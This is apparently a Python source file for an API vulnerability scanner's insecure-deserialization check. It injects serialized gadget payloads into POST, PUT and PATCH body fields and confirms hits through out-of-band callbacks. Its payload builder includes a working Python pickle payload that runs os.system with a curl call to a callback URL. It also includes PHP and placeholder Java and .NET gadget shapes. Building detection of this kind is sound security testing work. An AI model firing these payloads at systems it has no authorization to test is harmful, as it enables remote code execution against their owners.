"""Insecure deserialization (premium): gadget payloads confirmed out-of-band.

Deserializing attacker-controlled data is remote code execution (CWE-502) when
the type is not constrained. The scanner cannot run every framework's gadget
chain, so it ships a small starter corpus and confirms the same way as every
other OOB class: an OAST callback proves the target executed the gadget and
fetched a URL we control.

The corpus is deliberately small and framework-labelled — Python pickle and PHP
unserialize are real payload shapes; the Java and .NET entries are markers that
name the vector and should be replaced with a curated ysoserial/.NET corpus. The
machinery (inject per-framework into a body field, correlate the callback) is
the deliverable, not the payload list.

Premium, and gated on ``mutate: true`` (a gadget is a write) plus an active OAST
server.
"""
from __future__ import annotations

import uuid

from app.domain.enums import Confidence, Severity
from app.engine.base import EngineFinding, ScanContext, render_path
from app.engine.resource_map import path_values

# framework -> (label, severity)
_FRAMEWORKS: list[tuple[str, str, Severity]] = [
    ("python_pickle", "Python pickle deserialization", Severity.critical),
    ("php_unserialize", "PHP unserialize deserialization", Severity.critical),
    ("java_ysoserial", "Java ysoserial deserialization", Severity.critical),
    ("dotnet", ".NET ObjectStateFormatter deserialization", Severity.critical),
]


def _payload_for(framework: str, url: str) -> str:
    """A gadget-shaped payload embedding ``url`` as the command/URL it reaches for."""
    if framework == "python_pickle":
        # Real pickle opcodes: os.system("curl <url>").
        return f"cos\nsystem\n(S'curl {url}'\ntR."
    if framework == "php_unserialize":
        # A serialized stdClass carrying the URL (shape is real; a __destruct
        # gadget chain would carry it the same way).
        return f'O:8:"stdClass":1:{{s:3:"url";s:{len(url)}:"{url}";}}'
    if framework == "dotnet":
        return f"<ResourceDictionary><string>{url}</string></ResourceDictionary>"
    # Java ysoserial is a binary/base64 gadget; a plain marker names the vector
    # and carries the URL for the OAST confirmation.
    return f"ysoserial:URLDNS({url})"


class DeserializationCheck:
    key = "deserialization"
    #: Premium: reserved for the paid tier, off unless ``premium: true``.
    premium = True

    def run(self, ctx: ScanContext) -> list[EngineFinding]:
        if not ctx.premium or not ctx.allow_mutation or not getattr(ctx.oob, "active", False):
            return []

        headers = ctx.primary_headers()
        # token -> (op, field, framework, label, severity, payload)
        pending: dict[str, tuple] = {}

        for op in ctx.operations:
            if op.method not in ("POST", "PUT", "PATCH") or not op.body_params:
                continue
            path = render_path(op.path, path_values(op, ctx.resource_ids))
            field = op.body_params[0]
            for framework, label, severity in _FRAMEWORKS:
                token = "d" + uuid.uuid4().hex[:16]
                url = ctx.oob.payload_url(token)
                if not url:
                    return self._collect(ctx, pending)
                payload = _payload_for(framework, url)
                r = ctx.probe.send(op.method, path, headers=headers, json={field: payload})
                if r is None:
                    return self._collect(ctx, pending)  # budget spent
                pending[token] = (op, field, framework, label, severity, payload)

        return self._collect(ctx, pending)

    def _collect(self, ctx, pending) -> list[EngineFinding]:
        findings: list[EngineFinding] = []
        for interaction in ctx.oob.poll():
            meta = pending.get(interaction.token)
            if meta is None:
                continue
            op, field, framework, label, severity, payload = meta
            findings.append(
                EngineFinding(
                    check=self.key,
                    confidence=Confidence.verified,
                    owasp_id="API10:2023",
                    severity=severity,
                    title=f"{label} confirmed via '{field}' on {op.method} {op.path}",
                    description=(
                        f"An out-of-band {interaction.protocol.upper()} callback proved "
                        f"the target deserialized attacker-controlled input after '{field}' "
                        f"was injected — a confirmed {label}."
                    ),
                    evidence={
                        "method": op.method,
                        "route": op.path,
                        "field": field,
                        "family": framework,
                        "payload": payload,
                        "oob_protocol": interaction.protocol,
                        "oob_source_ip": interaction.source_ip,
                        "oob_token": interaction.token,
                    },
                    operation_id=op.id,
                )
            )
        return findings
